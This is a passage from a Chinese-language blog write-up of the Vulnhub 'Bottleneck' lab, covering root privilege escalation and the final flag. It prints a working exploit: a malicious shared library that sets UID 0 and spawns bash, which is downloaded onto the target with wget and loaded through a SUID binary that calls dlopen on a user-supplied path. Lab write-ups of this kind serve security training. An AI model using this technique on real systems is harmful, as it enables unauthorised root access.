+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-rwsr-x--- 1 root tester 16528 Sep 26  2019 /usr/test/testlib
+</span></span></code></pre></td></tr></table></div></div><p>这里需要注意：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-rwsr-x---
+</span></span><span class=line><span class=cl>  ^
+</span></span><span class=line><span class=cl>  SUID
+</span></span></code></pre></td></tr></table></div></div><p>该文件属于 <code>root</code>，同时当前 <code>bytevsbyte</code> 用户属于 <code>tester</code> 用户组，因此具备执行这个 SUID 程序的权限。</p><h3 id=分析-testlib>分析 testlib</h3><p>先查看文件类型：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file /usr/test/testlib
+</span></span></code></pre></td></tr></table></div></div><p>结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/test/testlib: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></td></tr></table></div></div><p>此时直接运行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/test/testlib
+</span></span></code></pre></td></tr></table></div></div><p>程序没有任何明显输出。</p><p>随后查看 <code>/usr/test</code> 目录：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -la /usr/test
+</span></span></code></pre></td></tr></table></div></div><p>发现除了 <code>testlib</code> 外，还存在一个源码文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-rw-r----- 1 root tester 281 Sep 27  2019 testlib.c
+</span></span></code></pre></td></tr></table></div></div><p>由于 <code>bytevsbyte</code> 属于 <code>tester</code> 用户组，因此可以直接读取源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat /usr/test/testlib.c
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]){</span>
+</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>handle</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>function</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>handle</span> <span class=o>=</span> <span class=nf>dlopen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>RTLD_LAZY</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>handle</span><span class=p>,</span> <span class=s>&#34;test_this&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>function</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=分析程序逻辑>分析程序逻辑</h3><p>这里最关键的是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>handle = dlopen(argv[1], RTLD_LAZY);
+</span></span><span class=line><span class=cl>function = dlsym(handle, &#34;test_this&#34;);
+</span></span><span class=line><span class=cl>function();
+</span></span></code></pre></td></tr></table></div></div><p>程序接收用户提供的第一个参数，并使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dlopen()
+</span></span></code></pre></td></tr></table></div></div><p>动态加载指定的共享库。</p><p>随后使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dlsym()
+</span></span></code></pre></td></tr></table></div></div><p>寻找共享库中的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>test_this
+</span></span></code></pre></td></tr></table></div></div><p>函数，最后直接执行该函数。</p><p>由于 <code>testlib</code> 本身是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root + SUID
+</span></span></code></pre></td></tr></table></div></div><p>运行该程序时具有 root 权限。</p><p>因此，如果能够控制 <code>test_this()</code> 的实现，就可以让它在 SUID 程序的权限上下文中执行我们的代码。</p><h2 id=编写恶意共享库>编写恶意共享库</h2><p>在 Kali 中创建 <code>test_this.c</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nano test_this.c
+</span></span></code></pre></td></tr></table></div></div><p>写入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test_this</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setuid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setgid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>其中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>setuid(0);
+</span></span><span class=line><span class=cl>setgid(0);
+</span></span></code></pre></td></tr></table></div></div><p>用于将进程的 UID/GID 设置为 root。</p><p>然后通过：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>system(&#34;/bin/bash&#34;);
+</span></span></code></pre></td></tr></table></div></div><p>启动一个 Bash Shell。</p><p>编译为共享库：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gcc -fPIC -shared test_this.c -o test_this.so
+</span></span></code></pre></td></tr></table></div></div><p>检查生成的文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file test_this.so
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>test_this.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, ...
+</span></span></code></pre></td></tr></table></div></div><h2 id=将共享库上传到靶机>将共享库上传到靶机</h2><p>由于当前靶机上的 <code>bytevsbyte</code> 用户可以访问 <code>/tmp</code>，因此将生成的 <code>test_this.so</code> 上传到 <code>/tmp</code>。</p><p>首先在 Kali 中开启简单的 HTTP 文件服务器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 -m http.server 8000
+</span></span></code></pre></td></tr></table></div></div><p>然后在靶机中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cd /tmp
+</span></span><span class=line><span class=cl>wget http://192.168.56.128:8000/test_this.so
+</span></span></code></pre></td></tr></table></div></div><p>确认文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -lh /tmp/test_this.so
+</span></span><span class=line><span class=cl>file /tmp/test_this.so
+</span></span></code></pre></td></tr></table></div></div><h2 id=利用-suid-程序加载恶意共享库>利用 SUID 程序加载恶意共享库</h2><p>现在让 <code>/usr/test/testlib</code> 加载我们准备好的共享库：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/test/testlib /tmp/test_this.so
+</span></span></code></pre></td></tr></table></div></div><p>成功获得 Shell：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@bottleneck:/tmp#
+</span></span></code></pre></td></tr></table></div></div><p>验证当前权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root),...
+</span></span></code></pre></td></tr></table></div></div><p>再执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>whoami
+</span></span></code></pre></td></tr></table></div></div><p>得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root
+</span></span></code></pre></td></tr></table></div></div><p>至此成功完成从 <code>bytevsbyte</code> 到 <code>root</code> 的权限提升。</p><h2 id=获取-root-flag>获取 Root Flag</h2><p>进入 <code>/root</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cd /root
+</span></span><span class=line><span class=cl>ls -liah
+</span></span></code></pre></td></tr></table></div></div><p>发现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root.txt
+</span></span></code></pre></td></tr></table></div></div><p>读取：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat /root/root.txt
+</span></span></code></pre></td></tr></table></div></div><p>得到 Bottleneck 的第二个 Flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{w0w_y0u_h4v3_r00t3d_bottleneck}
+</span></span></code></pre></td></tr></table></div></div><p>至此，Bottleneck 两个 Flag 均已获取，靶场完成。</p></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
